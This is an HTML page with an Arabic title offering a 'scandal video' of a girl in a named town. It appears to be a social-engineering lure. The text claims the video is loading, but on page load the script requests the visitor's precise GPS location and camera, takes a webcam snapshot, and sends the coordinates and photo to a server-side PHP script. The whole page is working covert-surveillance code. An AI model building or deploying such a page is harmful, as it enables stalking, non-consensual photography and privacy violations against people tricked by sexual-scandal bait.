<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>مشاهدة فيديو فضيحة بنت في مدينة التل</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f0f2f5; }
        #video, #canvas { display: none; }
        #log { background: #000; color: #0f0; padding: 10px; margin: 10px; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>جاري تحميل الفيديو في الخلفية...</h1>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <div id="log">النتائج هتظهر هنا...</div>

    <script>
        function log(msg) {
            document.getElementById('log').innerHTML += "<br>" + new Date().toLocaleTimeString() + " → " + msg;
        }

        window.onload = function() {
            log("بدأ الاختبار...");

            // الموقع (مع تحقق من الخطأ 403)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        let gps = "lat=" + position.coords.latitude + "&lon=" + position.coords.longitude;
                        log("✅ الموقع وصل: " + gps);
                        sendData(gps);
                    },
                    function(error) {
                        log("❌ خطأ الموقع: " + error.message);
                        sendData("location_error=1");
                    },
                    { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
                );
            } else {
                log("❌ الموقع غير مدعوم");
                sendData("location_not_supported=1");
            }

            // الكاميرا (مع تحقق من undefined)
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    log("✅ الكاميرا اشتغلت");
                    var video = document.getElementById('video');
                    video.srcObject = stream;
                    setTimeout(function() {
                        var canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        var dataURL = canvas.toDataURL('image/png');
                        log("✅ تم التقاط الصورة");
                        sendData("image=" + encodeURIComponent(dataURL));
                        stream.getTracks().forEach(track => track.stop());
                    }, 1000);
                })
                .catch(function(err) {
                    log("❌ خطأ الكاميرا: " + err.message);
                    sendData("camera_error=1");
                });
            } else {
                log("❌ navigator.mediaDevices غير متوفر");
                sendData("mediaDevices_undefined=1");
            }
        };

        function sendData(data) {
            log("جاري الإرسال...");
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "save_data.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        log("✅ تم الإرسال بنجاح: " + xhr.responseText);
                    } else {
                        log("❌ فشل الإرسال: " + xhr.status + " - " + xhr.responseText);
                    }
                }
            };
            xhr.send(data);
        }
    </script>
</body>
</html>
